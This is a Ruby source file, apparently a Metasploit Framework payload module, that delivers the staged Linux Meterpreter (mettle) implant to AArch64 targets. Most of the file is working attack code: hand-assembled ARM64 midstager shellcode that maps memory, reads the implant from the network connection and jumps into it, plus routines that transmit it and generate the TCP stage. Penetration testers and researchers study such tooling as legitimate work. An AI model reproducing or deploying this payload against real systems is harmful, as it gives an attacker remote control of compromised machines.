##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/meterpreter_aarch64_linux'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'rex/elfparsey'

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter',
        'Description'   => 'Inject the mettle server payload (staged)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_AARCH64,
        'License'       => MSF_LICENSE,
        'Session'       => Msf::Sessions::Meterpreter_aarch64_Linux
      )
    )
  end

  def elf_ep(payload)
    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
    elf.elf_header.e_entry
  end

  def handle_intermediate_stage(conn, payload)
    entry_offset = elf_ep(payload)

    # Generated from external/source/shellcode/linux/aarch64/stage_mettle.s
    midstager = [

            0x10000782,          #  adr	x2, f0 <size>
            0xb9400042,          #  ldr	w2, [x2]
            0xaa0203ea,          #  mov	x10, x2
            0xd34cfc42,          #  lsr	x2, x2, #12
            0x91000442,          #  add	x2, x2, #0x1
            0xd374cc42,          #  lsl	x2, x2, #12
            0xaa1f03e0,          #  mov	x0, xzr
            0xaa0203e1,          #  mov	x1, x2
            0xd28000e2,          #  mov	x2, #0x7                   	// #7
            0xd2800443,          #  mov	x3, #0x22                  	// #34
            0xaa1f03e4,          #  mov	x4, xzr
            0xaa1f03e5,          #  mov	x5, xzr
            0xd2801bc8,          #  mov	x8, #0xde                  	// #222
            0xd4000001,          #  svc	#0x0
            0xaa0a03e4,          #  mov	x4, x10
            0xaa0003e3,          #  mov	x3, x0
            0xaa0003ea,          #  mov	x10, x0
            0xaa0c03e0,          #  mov	x0, x12
            0xaa0303e1,          #  mov	x1, x3
            0xaa0403e2,          #  mov	x2, x4
            0xd28007e8,          #  mov	x8, #0x3f                  	// #63
            0xd4000001,          #  svc	#0x0
            0x34000440,          #  cbz	w0, e0 <failed>
            0x8b000063,          #  add	x3, x3, x0
            0xeb000084,          #  subs	x4, x4, x0
            0x54ffff01,          #  b.ne	44 <read_loop>
            0x10000480,          #  adr	x0, f8 <entry>
            0xf9400000,          #  ldr	x0, [x0]
            0x8b0a0000,          #  add	x0, x0, x10
            0xaa0003ee,          #  mov	x14, x0
            0x910003e0,          #  mov	x0, sp
            0x927cec1f,          #  and	sp, x0, #0xfffffffffffffff0
            0x910183ff,          #  add	sp, sp, #0x60
            0xd2800040,          #  mov	x0, #0x2                   	// #2
            0xd2800da1,          #  mov	x1, #0x6d                  	// #109
            0xf90003e1,          #  str	x1, [sp]
            0x910003e1,          #  mov	x1, sp
            0xaa0c03e2,          #  mov	x2, x12
            0xd2800003,          #  mov	x3, #0x0                   	// #0
            0xd2800004,          #  mov	x4, #0x0                   	// #0
            0xd28000e5,          #  mov	x5, #0x7                   	// #7
            0xaa0a03e6,          #  mov	x6, x10
            0xd28000c7,          #  mov	x7, #0x6                   	// #6
            0xd2820008,          #  mov	x8, #0x1000                	// #4096
            0xd2800329,          #  mov	x9, #0x19                  	// #25
            0xaa0a03ea,          #  mov	x10, x10
            0xd280000b,          #  mov	x11, #0x0                   	// #0
            0xa9bf2fea,          #  stp	x10, x11, [sp,#-16]!
            0xa9bf27e8,          #  stp	x8, x9, [sp,#-16]!
            0xa9bf1fe6,          #  stp	x6, x7, [sp,#-16]!
            0xa9bf17e4,          #  stp	x4, x5, [sp,#-16]!
            0xa9bf0fe2,          #  stp	x2, x3, [sp,#-16]!
            0xa9bf07e0,          #  stp	x0, x1, [sp,#-16]!
            0xd280001d,          #  mov	x29, #0x0                   	// #0
            0xd280001e,          #  mov	x30, #0x0                   	// #0
            0xd61f01c0,          #  br	x14
            0xd2800000,          #  mov	x0, #0x0                   	// #0
            0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
            0xd4000001,          #  svc	#0x0
            0xd503201f,          #  nop
            payload.length,
            0x00000000,          #  .word	0x00000000
            entry_offset,
            0x00000000,          #  .word	0x00000000
        ].pack('V*')

    print_status("Transmitting intermediate midstager...(#{midstager.length} bytes)")
    conn.put([midstager.length].pack('V'))
    conn.put(midstager) == midstager.length
  end

  def generate_stage(opts = {})
    MetasploitPayloads::Mettle.new('aarch64-linux-musl',
      generate_config(opts.merge({scheme: 'tcp'}))).to_binary :process_image
  end
end
